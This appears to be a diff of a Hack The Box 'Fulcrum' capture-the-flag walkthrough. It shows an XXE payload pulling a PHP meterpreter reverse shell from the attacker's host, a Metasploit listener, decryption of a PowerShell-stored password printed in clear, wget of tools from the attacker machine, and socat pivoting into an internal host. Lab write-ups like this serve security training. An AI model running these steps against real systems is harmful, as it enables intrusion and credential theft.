@@ -143,64 +143,96 @@ Create a new xml.txt
 <r>&sp;</r>
 ```
 
-=> Host a php reverse shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.171 LPORT=4442 > dotashell.php
-
-python -m SimpleHTTPServer 80
-
-=> create xml.txt
-xml.txt: 
-
-<?xml version="1.0" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.171/dotashell">
-]>
-<r>&sp;</r>
-
-=> start Listner
-msfconsole
-use exploit/multi/handler
-set payload php/meterpreter/reverse_tcp
-set LHOST 
-set LPORT 
-run
-
-=> Exec Payload
+Exec Payload
+```
 curl -d @xml.txt http://10.10.10.62:56423
 
-=> decrypt Password present inside Fulcrum_Upload_to_Corp.ps1
-Decrypt Password from ps1:
+10.10.10.62 - - [13/Dec/2017 03:26:08] "GET /dotashell.php HTTP/1.0" 200 -
+
+[*] Meterpreter session 1 opened (10.10.14.99:4442 -> 10.10.10.62:36316) at 2017-12-13 03:26:08 -0500
+meterpreter > 
+```
+
+We see a ps1 file in the machine O.o
+```
+meterpreter > cat Fulcrum_Upload_to_Corp.ps1
+# TODO: Forward the PowerShell remoting port to the external interface
+# Password is now encrypted \o/
+
+$1 = 'WebUser'
+$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
+$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
+$4 = $3 | ConvertTo-SecureString -key $2
+$5 = New-Object System.Management.Automation.PSCredential ($1, $4)
+
+Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
+```
+
+It does have the encrypted password as mentioned but i dont think it would be that hard to decypt it
+
+We would just need to add this line to it and decrypt 
+```
 (New-Object System.Management.Automation.PSCredential 'N/A', $4).GetNetworkCredential().Password
+```
+We get the Username and Password as 
 
-Username: WebUser
-Pass: M4ng£m£ntPa55
 
-=> Connecting to remote powershell 
+> Username : WebUser | Password : M4ng£m£ntPa55
 
-On meterpreter:
-download this on the remote machine
-https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
-make it executable
-forward ports:
-./socat tcp-listen:5986,reuseaddr,fork tcp:192.168.122.228:5986
+We gotta find the upload.fulcrum.local
 
-./socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:5986
+```
+arp -n
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.122.228          ether   52:54:00:74:9d:17   C                     virbr0
+10.10.10.2               ether   00:50:56:aa:9c:8d   C                     ens32
+```
 
-Use windows machine to get the remote powershell with this script
+Lets upload a nmap static binary (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and scan 192.168.122.228 for open ports 
+
+```
+wget http://10.10.14.99/nmap
+
+chmod 777 nmap
+
+./nmap -v -p- 192.168.122.228
+PORT     STATE SERVICE
+80/tcp   open  http
+5986/tcp open  unknown
+8080/tcp open  http-alt
+```
+
+That 5986 port looks familiar!!
+
+That ip is the upload.fulcrum.local !!
+
+I prefer using powershell from windows, instead of porting something to the linux machine or using some kind of script
+
+So lets do some port forwading and get a powershell session! :smile:
+* Steps
+    * Download a Stand Alone socat binary from (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
+    * Move it to the vm ``` upload socat ```
+    * Port forward 5986 from upload.fulcrum.local ``` ./socat tcp-listen:5986,reuseaddr,fork tcp:192.168.122.228:5986```
+    * Portforward te 5986 from the remote machine to the local kali machine ``` socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:5986 ```
+    * Check on the kali machine if the portforwarding works ``` nc -nv 127.0.0.1 5986 ```
+    * *The widows machine and the kali machine should be in the same network for this to work*
+    
+
+Create a script on the windows machine which would give us a PSSession
+```
 ------------------------------------------------
 $1 = 'WebUser'
 $2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
 $3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='
 $4 = $3 | ConvertTo-SecureString -key $2
 $5 = New-Object System.Management.Automation.PSCredential ($1, $4)
-
-#Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
-$o = New-PSSessionOption -SkipCACheck -SkipCNCheck
-Enter-PSSEssion -Computer 192.168.1.106 -Credential $5 -UseSSL -SessionOption $o
+$a = New-PSSessionOption -SkipCACheck -SkipCNCheck
+Enter-PSSession -Computer 192.168.1.41 -Credential $5 -UseSSL -SessionOption $a
 ------------------------------------------------
+```
 
-=> ps -aux on linux machine to find the cmdk names
+
+=> ps -aux on linux machine to find the vmdk names
 
 10.25.25.1 => PfSense
 10.25.25.2 => DC (LDAP)
